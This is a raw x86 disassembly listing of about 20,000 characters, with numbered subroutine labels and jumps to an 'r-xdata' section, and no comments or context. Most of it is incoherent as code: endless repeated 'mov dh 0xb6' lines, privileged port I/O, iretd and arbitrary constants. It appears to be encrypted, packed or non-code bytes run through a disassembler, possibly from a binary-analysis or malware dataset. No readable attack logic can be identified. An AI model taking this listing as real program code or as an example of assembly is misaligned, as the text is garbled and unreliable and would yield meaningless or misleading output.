xchg [ 0xffffffffb6b62626 ] bh
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
jl r-xdata
mov dh 0xb6
mov dh 0xb6
jae r-xdata
push ecx
inc eax
scasd [ edi ]
jae r-xdata
0xcaa5
mov dh 0xb6
iretd
jl r-xdata
push esp
iretd
sub_473337
xlat
fstpnce st1
mov dh 0xd
daa
in eax 0xb6
mov dh 0xb6
mov dh 0xb6
jae r-xdata
jbe r-xdata
0x9cf
mov dh 0x71
stosd [ edi ]
mov [ 0xffffffffd9d9dbf2 ] eax
jne r-xdata
jne r-xdata
mov [ es : 0xffffffffd9a329e6 ] eax
iretd
lodsd [ esi ]
and [ ebp - 0x27 ] esi
mov cl 0xc6
mov [ es : 0xda329e6 ] eax
cmp ah [ esi ]
dec esp
jpe r-xdata
daa
stosd [ edi ]
pop ebx
out dx al
stosd [ edi ]
stosd [ edi ]
xchg esi eax
fcmovnu st1
fxch st7
out dx al
mov dh 0xb6
mov dh 0xb6
mov dh 0x70
jo r-xdata
mov [ 0x26262433 ] eax
stosd [ edi ]
pop ebx
into
stosd [ edi ]
stosd [ edi ]
xchg esi eax
fcmovnu st1
fxch st6
add cl [ edi ]
mov [ es : 0xffffffffd9a329e6 ] eax
dec ebp
adc al 0x26
mov dh 0xb6
mov dh 0xb6
mov dh 0xab
imul edi esi 0x77
iretd
fnstenv [ esi - 0x5c10ea4a ]
out 0x29 al
mov edi 0xefe7ade7
in eax 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x29
mov [ 0x26260318 ] eax
jbe r-xdata
pop ss
rcr cl cl
fld [ eax - 0x51 ]
arpl sp cx
jle r-xdata
iretd
push edx
iretd
sub_473377
cmp [ esi ] esp
mov dh 0xb6
mov dh 0xb6
jae r-xdata
push ecx
inc eax
scasd [ edi ]
jae r-xdata
0xcaa5
mov dh 0xb6
iretd
jl r-xdata
push esp
iretd
sub_473385
adc eax 0xcf7170e6
jns r-xdata
movsd [ edi ] es : [ esi ]
pop edx
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
sub [ edx + 0x26263ae1 ] esp
lodsd [ esi ]
fisub [ 0xffffffff9ba229dd ]
cmp ah [ esi ]
movsd [ edi ] es : [ esi ]
pop edx
add bh [ edx ]
daa
sub [ ebx + 0x26263061 ] esp
movsd [ edi ] [ esi ]
mov [ 0xffffffffd9a329e6 ] eax
nop
and [ esi - 0x59 ] esi
loope r-xdata
daa
stosd [ edi ]
pop ebx
out dx al
stosd [ edi ]
stosd [ edi ]
xchg esi eax
fcmovnu st1
fxch st7
out dx al
mov dh 0xb6
mov dh 0xb6
mov dh 0x70
jo r-xdata
mov [ 0x26262433 ] eax
stosd [ edi ]
pop ebx
into
stosd [ edi ]
stosd [ edi ]
xchg esi eax
fcmovnu st1
fxch st6
add cl [ edi ]
mov [ es : 0xffffffffd9a329e6 ] eax
dec ebp
adc al 0x26
mov dh 0xb6
mov dh 0xb6
mov dh 0xab
imul edi esi 0x77
iretd
add dh [ edx ]
daa
sub [ ebx - 0x26263b25 ] esp
stosd [ edi ]
popad
daa
jbe r-xdata
stosd [ edi ]
mov [ 0x26248602 ] al
iretd
sub_4733d4
mov edi 0x29d9d9c0
mov [ 0x26262433 ] eax
stosd [ edi ]
pop ebx
into
stosd [ edi ]
stosd [ edi ]
xchg esi eax
fcmovnu st1
fxch st6
add cl [ edi ]
mov [ es : 0xffffffffd9a329e6 ] eax
daa
stosd [ edi ]
pop ebx
out dx al
stosd [ edi ]
stosd [ edi ]
xchg esi eax
fcmovnu st1
fxch st7
out dx al
mov dh 0xb6
mov dh 0xb6
mov dh 0x70
jo r-xdata
dec ebp
adc al 0x26
mov dh 0xb6
mov dh 0xb6
mov dh 0xab
imul edi esi 0x77
iretd
sub_473425
fstpnce st1
fnstenv [ esi - 0x4949494a ]
mov dh 0xb6
loope r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
lodsd [ esi ]
0x26cf
fisub [ edi ]
dec esp
push ss
iretd
sub_473439
pushad
movsd [ edi ] es : [ esi ]
loop r-xdata
loope r-xdata
dec esi
fadd [ esi + 0x45 ]

mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
lodsd [ esi ]
arpl [ esi ] bp
inc eax
scasd [ edi ]
imul eax esp 0xffffffce
and dh [ eax ]
jg r-xdata
iretd
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xad
0x26cf
loop r-xdata
iretd
mov dh 0x70
into
sub_47345c
dec esi
sub cl [ ecx - 0x508e681b ]
pushad
cmp cl dh
xchg esi eax
rcr ecx cl
fxch st7
fadd st0
fstpnce st1
sub [ edi + 0x262637c3 ] ebp
pop ds
pop ebx
fisubr [ ecx ]
mov [ 0x262637fa ] eax
iretd
sub_4734ce
aam 0xd9
fnstcw [ edi - 0x51 ]
bound eax [ edx ]
cmp bl [ 0xffffffff94a229e5 ]
and ah [ esi ]
jne r-xdata
jecxz r-xdata
xlat
cmp ecx [ edi + 0x66 ]
fst [ eax + 0x262626e2 ]
lodsd [ esi ]
fmul st6
test [ esi ] dh
iretd
mov dh 0x4c
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xd9
jno r-xdata
shl [ edi ] cl
fnstenv [ es : ecx + 0x2e ]
fst [ edx + 0x2 ]
iretd
dec esp
iretd
sub_4734ff
aad 0xce
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x7e
dec esp
pop esi
lodsd [ esi ]
salc
inc eax
scasd [ edi ]
push ebx
les edi [ eax - 0x53 ]
clc
iretd
sub_4735b8
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
sub [ ebx + 0x262625c5 ] esp
jo r-xdata
jge r-xdata
mov dh 0x20
iretd
iretd
scasd [ edi ]
jpo r-xdata
iretd
iretd
sub_47360b
sahf
cmp eax 0xb6b62626
mov [ 0xffffffffe7bf29e6 ] eax
lodsd [ esi ]
out 0xef eax
in eax 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xce
mov ecx ds
fstpnce st1
iretd
sub_473682
aad 0xd9
fst [ 0xffffffffb6e566e6 ]
mov dh 0xb6
mov dh 0xb6
stosd [ edi ]
mov [ 0xffffffffd9d9dc9a ] eax
jbe r-xdata
mov dh 0xb6
mov dh 0x29
mov eax [ 0x26262504 ]
dec esi
fimul [ esi ]
iretd
popfd
sub al 0x26
dec esp
push edx
inc eax
scasd [ edi ]
imul edx esp 0xffffffcf
iretd
sub_4736cc
mov dh 0x70
jno r-xdata
and ah [ esi ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
jo r-xdata
cwde
and eax 0x44cf6841
retn 0xd9d9
mov dh 0xb6
xchg esi eax
fcmovu st1
fxch st7
pushad
add esp [ esi ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
into
leave
adc esp [ esi ]
iretd
arpl si bx
sahf
sub [ es : edi + ebp * 4 - 0x6b302585 ] eax
pop ss
mov dh 0xb6
dec esp
and al 0xcf
movsd [ edi ] [ esi ]
rcr ecx 0x1
fnstenv [ esi - 0x4949494a ]
mov dh 0xb6
mov dh 0xd9
push eax
jbe r-xdata
fstpnce st1
iretd
mov dl 0x7
iretd
arpl dx cx
jbe r-xdata
scasd [ edi ]
arpl dx bx
scasd [ edi ]
arpl dx dx
scasd [ edi ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
into
jbe r-xdata
mov [ edx ] bh
mov dh 0xb6
sub_4736dc
mov dh 0xb6
mov dh 0xb6
dec esp
dec edi
inc eax
scasd [ edi ]
arpl dx cx
jle r-xdata
adc eax 0x94cf66e6
out 0x29 al
mov dh 0xaf
mov dl 0x7
iretd
arpl dx cx
jbe r-xdata
arpl dx bx
scasd [ edi ]
arpl dx dx
scasd [ edi ]
scasd [ edi ]
mov [ edx ] bh
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
into
jbe r-xdata
arpl si bx
sahf
sub [ es : edi + ebp * 4 - 0x6b302585 ] eax
pop ss
mov dh 0xb6
dec esp
and al 0xcf
movsd [ edi ] [ esi ]
rcr ecx 0x1
fnstenv [ esi - 0x4949494a ]
mov dh 0xb6
mov dh 0xd9
push eax
jbe r-xdata
fstpnce st1
iretd
sub_473736
fstpnce st1
mov dh 0xa5
inc ebx
fisub [ esi ]
stosd [ edi ]
imul ebx edx 0x77
jbe r-xdata
out 0xd1 al
and al 0xcf
shl [ edx ] 0x1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
jo r-xdata
mov dh 0xb6
xchg esi eax
fcmovu st1
fxch st7
pushad
add esp [ esi ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
into
leave
adc esp [ esi ]
iretd
arpl si bx
sahf
sub [ es : edi + ebp * 4 - 0x6b302585 ] eax
pop ss
mov dh 0xb6
dec esp
and al 0xcf
movsd [ edi ] [ esi ]
rcr ecx 0x1
fnstenv [ esi - 0x4949494a ]
mov dh 0xb6
mov dh 0xd9
push eax
jbe r-xdata
fstpnce st1
iretd
mov dl 0x7
iretd
arpl dx cx
jbe r-xdata
scasd [ edi ]
arpl dx bx
scasd [ edi ]
arpl dx dx
scasd [ edi ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
into
jbe r-xdata
mov [ edx ] bh
mov dh 0xb6
sub_473769
xor al 0x26
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
into
cmpsd [ esi ] [ edi ]
cmp [ esi ] ah
lodsd [ es : esi ]
jae r-xdata
mov dh 0xb6
mov dh 0xd9
mov al 0x8a
dec esi
in eax 0x26
dec esp
jo r-xdata
into
pop edi
cmp [ esi ] ah
stosd [ edi ]
jae r-xdata
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xd1
dec eax
or al 0x26
movsd [ edi ] es : [ esi ]
loop r-xdata
fcmovu st1
fxch st7
pushad
add esp [ esi ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
into
leave
adc esp [ esi ]
iretd
iretd
fmulp st7
iretd
sub_47378e
cmp eax 0xeffed1e6
in eax 0xa3
out 0xcf al
or [ esi ] esp
inc eax
scasd [ edi ]
jpo r-xdata
mov dh 0xcf
into
rcr cl cl
fnstenv [ esi + 0x76b6b6b6 ]
iretd
jge r-xdata
mov dh 0xb6
into
cmpsd [ esi ] [ edi ]
cmp [ esi ] ah
lodsd [ es : esi ]
jae r-xdata
mov [ edx ] ss
mov dh 0xb6
mov dh 0xd9
mov al 0x8a
dec esi
in eax 0x26
dec esp
jo r-xdata
mov dh 0xb6
into
pop edi
cmp [ esi ] ah
stosd [ edi ]
jae r-xdata
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xd1
dec eax
or al 0x26
movsd [ edi ] es : [ esi ]
loop r-xdata
fcmovu st1
fxch st7
pushad
add esp [ esi ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
into
leave
adc esp [ esi ]
iretd
iretd
fmulp st7
iretd
sub_47386e
cmp al 0xd9
fnstenv [ esi + 0x67325325 ]
sbb eax 0x99cf2a6b
adc eax 0xb6e5efe6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xaf
arpl si cx
lodsd [ esi ]
arpl dx dx
scasd [ edi ]
arpl dx cx
iretd
scasd [ edi ]
jpo r-xdata
or bh [ edx ]
mov dh 0xb6
lodsd [ esi ]
stc
inc eax
scasd [ edi ]
jpo r-xdata
mov dh 0x29
mov [ 0x26262623 ] al
into
stosd [ edi ]
adc [ esi ] ah
iretd
mov dh 0xb6
lodsd [ esi ]
inc [ eax - 0x51 ]
jpo r-xdata
rcr ecx 0xd9
mov dh 0xb6
mov dh 0x4c
dec edi
jge r-xdata
and eax 0x1d673253
imul ebp [ edx ] 0xffffffcf
cdq
lodsd [ esi ]
clc
iretd
sub_4738e4
arpl [ eax ] sp
jne r-xdata
push es
adc eax 0xb6e5efe6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xaf
arpl si cx
lodsd [ esi ]
arpl dx dx
scasd [ edi ]
arpl dx cx
iretd
jno r-xdata
stosd [ edi ]
stosd [ edi ]
xchg esi eax
fcmovnu st1
fxch st6
popad
aam 0xd9
fldcw [ ebx - 0x42312da5 ]
add eax 0xa3cf2626
iretd
sbb eax 0x44a229e5
push es
dec esp
and cl bh
rcl ch 0x1
fstpnce st1
mov dh 0xb6
mov dh 0x40
scasd [ edi ]
in eax 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
stosd [ edi ]
mov [ 0xffffffffd9d9dace ] eax
iretd
sub_473921
loop r-xdata
into
fcmovnu st1
fnstenv [ esi - 0x53 ]
arpl [ esi ] bp
dec esp
fnstenv [ es : esi + 0x6a ]
mov [ 0xffffffffdca229e6 ] eax
clc
fstpnce st1
stosd [ edi ]
stosd [ edi ]
xchg esi eax
fcmovnu st1
fxch st6
popad
aam 0xd9
fldcw [ ebx - 0x42312da5 ]
add eax 0xa3cf2626
iretd
iretd
sub_473924
add eax edx
fstpnce st1
mov dh 0xb6
fst [ ebx + 0x2a ]
into
sub eax 0xcf26262b
or al al
fstpnce st1
mov dh 0xcf
and [ ebx ] dl
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xa3
out 0x29 al
mov [ 0x262636a6 ] al
iretd
sub_4739b1
mov dh 0x7d
out dx eax
in eax 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xce
sub eax esi
fstpnce st1
jg r-xdata
fcmovu st1
fstp [ ecx + 0x2626478e ]
loope r-xdata
dec edi
sub [ esi ] ah
mov dh 0xb6
mov dh 0x23
mov [ 0x76262626 ] al
stosd [ edi ]
mov [ 0x2626be02 ] al
jbe r-xdata
and eax 0x91292626
xor dl [ edi - 0x5b ]
add bh [ esi ]
mov esi 0x4c26261c
and cl [ esi + 0x26 ]
push ss
iretd
jge r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
inc eax
scasd [ edi ]
arpl [ esi + edi * 2 ] di
dec esp
dec eax
inc eax
scasd [ edi ]
arpl [ edx ] di
lodsd [ esi ]
in al 0xcf
sub [ eax ] edi
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x70
into
in al 0xf6
movsd [ edi ] [ esi ]
fsubr [ edi ]
movsd [ edi ] [ esi ]
movsd [ edi ] es : [ esi ]
loop r-xdata
mov dh 0x7f
jg r-xdata
scasd [ edi ]
and [ 0x72a229e5 ] bl
sub [ ecx - 0x26263615 ] esp
pushad
sbb eax 0x2515cfd6
mov dh 0xb6
jne r-xdata
das
mov [ 0x6da229e6 ] eax
enter 0xd9d9 0xcf
push ebx
adc ah [ esi ]
stc
fstpnce st1
sahf
jg r-xdata
test bh bl
fstpnce st1
mov dh 0xb6
inc eax
scasd [ edi ]
arpl si si
lodsd [ esi ]
in al 0x40
scasd [ edi ]
arpl sp si
jle r-xdata
lodsd [ esi ]
salc
iretd
inc eax
scasd [ edi ]
pushad
lodsd [ cs : esi ]
arpl [ esi ] si
iretd
fstpnce st1
jno r-xdata
mov edi 0xb6d9d9c3
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
jo r-xdata
add ebx edx
fstpnce st1
iretd
mov dh 0xce
add al 0xd6
fstpnce st1
iretd
and al 0xe
fst [ es : ebx + 0x2a ]
fst [ ebx + 0x2e ]
into
into
leave
fstpnce st1
movsd [ edi ] [ esi ]
loop r-xdata
sub_4739f9
add al ch
fstpnce st1
mov dh 0x1d
in eax 0x29
mov al [ 0x26262577 ]
sub [ ecx - 0x1b5aa8ce ] edx
mul [ ebp - 0x5ed6d024 ]
jmp r-xdata
into
jge r-xdata
movsd [ edi ] [ esi ]
in al 0xf6
movsd [ edi ] [ esi ]
fsubr [ edi ]
movsd [ edi ] es : [ esi ]
loop r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
inc eax
scasd [ edi ]
arpl [ esi + edi * 2 ] di
dec esp
dec eax
inc eax
scasd [ edi ]
arpl [ edx ] di
lodsd [ esi ]
in al 0xcf
sub [ eax ] edi
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x70
into
sub [ ecx - 0x26263615 ] esp
pushad
sbb eax 0x2515cfd6
mov dh 0xb6
jne r-xdata
das
mov [ 0x6da229e6 ] eax
enter 0xd9d9 0xcf
push ebx
adc ah [ esi ]
mov dh 0x7f
jg r-xdata
scasd [ edi ]
and [ 0x72a229e5 ] bl
stc
fstpnce st1
sahf
jg r-xdata
test bh bl
fstpnce st1
mov dh 0xb6
inc eax
scasd [ edi ]
arpl si si
lodsd [ esi ]
in al 0x40
scasd [ edi ]
arpl sp si
jle r-xdata
lodsd [ esi ]
salc
iretd
inc eax
scasd [ edi ]
pushad
lodsd [ cs : esi ]
arpl [ esi ] si
iretd
fstpnce st1
jno r-xdata
mov edi 0xb6d9d9c3
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
jo r-xdata
add ebx edx
fstpnce st1
iretd
mov dh 0xce
add al 0xd6
fstpnce st1
iretd
and al 0xe
fst [ es : ebx + 0x2a ]
fst [ ebx + 0x2e ]
into
into
leave
fstpnce st1
movsd [ edi ] [ esi ]
loop r-xdata
sub_473a57
rcl [ 0xffffffffb6b62626 ] 0x1
mov dh 0xb6
mov dh 0x29
xchg ecx eax
pushad
and bh cl
adc ah [ esi ]
mov dh 0x7f
stc
fstpnce st1
sahf
jg r-xdata
test bh bl
fstpnce st1
mov dh 0xb6
inc eax
scasd [ edi ]
arpl si si
lodsd [ esi ]
in al 0x40
scasd [ edi ]
arpl sp si
jle r-xdata
lodsd [ esi ]
salc
iretd
inc eax
scasd [ edi ]
pushad
lodsd [ cs : esi ]
arpl [ esi ] si
iretd
fstpnce st1
jno r-xdata
mov edi 0xb6d9d9c3
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
inc eax
scasd [ edi ]
arpl [ esi + edi * 2 ] di
dec esp
dec eax
inc eax
scasd [ edi ]
arpl [ edx ] di
lodsd [ esi ]
in al 0xcf
sub [ eax ] edi
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x70
jo r-xdata
add ebx edx
fstpnce st1
iretd
mov dh 0xce
add al 0xd6
fstpnce st1
iretd
and al 0xe
fst [ es : ebx + 0x2a ]
fst [ ebx + 0x2e ]
into
into
leave
fstpnce st1
movsd [ edi ] [ esi ]
loop r-xdata
jg r-xdata
mov dh 0x7f
scasd [ edi ]
and [ 0x72a229e5 ] bl
sub_473b2e
push es
or esp [ esi ]
jns r-xdata
r-xdata
out dx eax
in eax 0xcf
mov eax [ edi ]
mov dh 0xb6
mov dh 0xb6
jge r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
into
fmulp st1
fstpnce st1
stosd [ edi ]
mov bl 0xd6
fstp st1
fxch st6
pop edx
vpsubusw xmm2 xmm4 xmm1
iretd
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xa3
out 0xcf al
pop ds
sub [ esi ] esp
inc eax
scasd [ edi ]
jpo r-xdata
scasd [ edi ]
push esp
rcr cl 0x1
fnstenv [ esi - 0x4949494a ]
mov dh 0xa5
pop ebx
sub ah [ esi ]
sub [ ebx + 0x26260a5f ] esp
lodsd [ esi ]
arpl [ esi ] bp
jpo r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0x29
jpo r-xdata
dec esp
inc ecx
lodsd [ esi ]
inc [ eax - 0x51 ]
scasd [ edi ]
mov ah 0x3e
iretd
adc eax 0x7baf40fd
into
lodsd [ esi ]
cld
inc eax
scasd [ edi ]
jpo r-xdata
mov dh 0xb6
jle r-xdata
lodsd [ esi ]
dec edi
jb r-xdata
mov al 0x92
jns r-xdata
add al 0xcf
imul eax edi 0xb6b6d9d9
mov dh 0xcf
loope r-xdata
mov dh 0x7e
dec esp
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x29
mov [ 0xffffffffd9d9c190 ] eax
iretd
mov dh 0xb6
mov dh 0xb6
sub [ edx - 0x2626253d ] esp
iretd
iretd
sub_473c2d
std
add [ esi ] esp
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x15
out 0x79 al
js r-xdata
mov dh 0x29
mov [ 0x26263b5d ] eax
stosd [ edi ]
arpl [ edx + 0x76 ] di
iretd
out dx eax
in eax 0x4e
clc
dec ebx
int1
test edi ecx
sbb al 0xde
fstpnce st1
iretd
sub_473c5c
loop r-xdata
iretd
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
jo r-xdata
fstpnce st1
iretd
jno r-xdata
fcmove st6
iretd
insd
jo r-xdata
iretd
iretd
arpl dx cx
imul ebp [ ebp + 0x70 ] 0x6b
loope r-xdata
push ebx
fmulp st7
dec [ esi ]
stosd [ edi ]
jl r-xdata
r-xdata
iretd
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
dec eax
jo r-xdata
mov dh 0xb6
loope r-xdata
arpl si di
imul ebp [ ebx + 0x7e ] 0x43
loope r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xd9
push ebx
cli
iretd
retn 0x706d
mov dh 0x29
mov [ 0x26260319 ] al
into
lds ecx [ edx ]
lodsd [ es : esi ]
cli
dec eax
jo r-xdata
salc
mov [ 0x16a229d0 ] eax
add esp [ esi ]
iretd
lodsd [ es : esi ]
imul ecx esi 0xfffffff4
sti
fstpnce st1
jns r-xdata
sub [ edx + 0x26262622 ] esp
scasd [ edi ]
pop edx
add cl [ edx ]
pop ds
pop edx
add bh [ edx ]
sub [ ebx + 0x26262623 ] esp
loopne r-xdata
jge r-xdata
sbb eax 0x78a229e1
add dh [ esi ]
pop ds
pop edx
add dl [ edx ]
sub [ ebx + 0x26262623 ] esp
loopne r-xdata
mov dh 0xaf
jpo r-xdata
out 0xcf al
inc ecx
fstp st1
fnstcw [ ecx - 0x31 ]
popfd
cmp eax 0xb6b62626
mov dh 0xb6
mov dh 0x29
movsb [ edi ] [ esi ]
mov edx ebx
fstpnce st1
into
and dh [ edx ]
iretd
mov dh 0xb6
mov dh 0x70
into
and eax 0xa5262602
loop r-xdata
bound eax [ edx ]
xor ah [ edi ]
into
salc
stc
fstpnce st1
jg r-xdata
add dh [ esi ]
and al 0x29
xchg ecx eax
bound eax [ gs : eax - 0x5d ]
out 0xcf al
stosd [ edi ]
arpl [ edx + 0x76 ] di
iretd
sbb eax [ ebx ]
movsd [ edi ] es : [ esi ]
loop r-xdata
into
add al [ edx ]
jg r-xdata
and al 0x26
into
pop eax
sub esp [ esi ]
sbb eax 0x78a229e1
fnstenv [ esi + 0x63abb6b6 ]
shl [ esi + 0x4c ] cl
fstpnce st1
push ebx
0xcecf
scasd [ edi ]
bound eax [ edx ]
adc cl dh
fsubr [ edx ]
movsd [ edi ] es : [ esi ]
inc edx
cmp [ edx ] al
movsd [ edi ] es : [ esi ]
loop r-xdata
bound eax [ edx ]
adc bl [ edi ]
pop edx
add dl [ esi ]
sub [ edx - 0x2626268f ] esp
jo r-xdata
add cl [ edx ]
jo r-xdata
stosd [ edi ]
arpl dx si
jbe r-xdata
movsd [ edi ] es : [ esi ]
inc edx
stosb [ edi ]
and [ esi ] ah
iretd
inc eax
mov [ 0xffffffffdaf0cfe6 ] eax
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xcf
test eax 0xb6262622
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
jbe r-xdata
sti
and eax 0xb6b62626
mov dh 0xb6
mov dh 0xb6
and esp [ esi ]
loopne r-xdata
sub_473c80
push esi
pop es
mov dh 0xce
mov dh 0xcb
fstpnce st1
dec esi
outsd
lodsd [ esi ]
cmc
mov eax 0x3660af71
into
movsb [ edi ] [ esi ]

sub_473cd0
xor edi ebx
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
scasd [ edi ]
stosd [ edi ]
arpl [ edx + 0x76 ] di
iretd
into
sbb eax [ ebx ]
movsd [ edi ] es : [ esi ]
loop r-xdata
insd
jo r-xdata
iretd
iretd
arpl dx cx
imul ebp [ ebp + 0x70 ] 0x6b
loope r-xdata
push ebx
fmulp st7
dec [ esi ]
stosd [ edi ]
jl r-xdata
r-xdata
iretd
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
dec eax
jo r-xdata
mov dh 0xb6
loope r-xdata
arpl si di
imul ebp [ ebx + 0x7e ] 0x43
loope r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xd9
push ebx
cli
iretd
retn 0x706d
mov dh 0x29
mov [ 0x26260319 ] al
into
lds ecx [ edx ]
lodsd [ es : esi ]
cli
dec eax
jo r-xdata
salc
mov [ 0x16a229d0 ] eax
add esp [ esi ]
iretd
lodsd [ es : esi ]
imul ecx esi 0xfffffff4
sti
fstpnce st1
jns r-xdata
sub [ edx + 0x26262622 ] esp
scasd [ edi ]
pop edx
add cl [ edx ]
pop ds
pop edx
add bh [ edx ]
sub [ ebx + 0x26262623 ] esp
loopne r-xdata
jge r-xdata
sbb eax 0x78a229e1
add dh [ esi ]
pop ds
pop edx
add dl [ edx ]
sub [ ebx + 0x26262623 ] esp
loopne r-xdata
jpo r-xdata
mov dh 0xaf
out 0xcf al
inc ecx
fstp st1
fnstcw [ ecx - 0x31 ]
popfd
cmp eax 0xb6b62626
mov dh 0xb6
mov dh 0x29
movsb [ edi ] [ esi ]
mov edx ebx
fstpnce st1
into
and dh [ edx ]
iretd
mov dh 0xb6
mov dh 0x70
into
and eax 0xa5262602
loop r-xdata
bound eax [ edx ]
xor ah [ edi ]
into
salc
stc
fstpnce st1
jg r-xdata
add dh [ esi ]
and al 0x29
xchg ecx eax
bound eax [ gs : eax - 0x5d ]
out 0xcf al
add al [ edx ]
jg r-xdata
and al 0x26
into
pop eax
sub esp [ esi ]
sbb eax 0x78a229e1
fnstenv [ esi + 0x63abb6b6 ]
shl [ esi + 0x4c ] cl
fstpnce st1
push ebx
0xcecf
scasd [ edi ]
bound eax [ edx ]
adc cl dh
fsubr [ edx ]
movsd [ edi ] es : [ esi ]
inc edx
cmp [ edx ] al
movsd [ edi ] es : [ esi ]
loop r-xdata
bound eax [ edx ]
adc bl [ edi ]
pop edx
add dl [ esi ]
sub [ edx - 0x2626268f ] esp
jo r-xdata
add cl [ edx ]
jo r-xdata
stosd [ edi ]
arpl dx si
jbe r-xdata
movsd [ edi ] es : [ esi ]
inc edx
stosb [ edi ]
and [ esi ] ah
iretd
inc eax
mov [ 0xffffffffdaf0cfe6 ] eax
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xcf
test eax 0xb6262622
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
jbe r-xdata
sti
and eax 0xb6b62626
mov dh 0xb6
mov dh 0xb6
and esp [ esi ]
loopne r-xdata
sub_473cff
scasd [ edi ]
add esp [ esi ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
loope r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xd9
push ebx
cli
iretd
retn 0x706d
sub_473d5d
aas
aas
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
fst [ ebx - 0x6 ]
iretd
sub_473eb7
fstpnce st1
mov dh 0xb6
mov dh 0xab
arpl dx dx
jbe r-xdata
scasd [ edi ]
mov al [ 0x262626d2 ]
dec esi
sbb [ edi - 0x318ecc5e ] 0xffffffdd
int3
fstpnce st1
push ebx
0xcecf
sub_473fb8
and esp [ esi ]
jbe r-xdata
sub cl bh
mov ch [ esi ]
js r-xdata
push esp
xor esp [ esi ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xd9
jo r-xdata
dec esi
cmp [ esi ] esp
sub [ esi ] esp
fst [ ebx + 0x2a ]
iretd
in eax 0x76
into
test al 0x4
lodsd [ es : esi ]
arpl [ esi ] si
iretd
iretd
adc eax 0xda5b1fe6
sub [ edx + 0x6bcf79e6 ] esi
add al 0x26
mov dh 0xb6
mov dh 0xb6
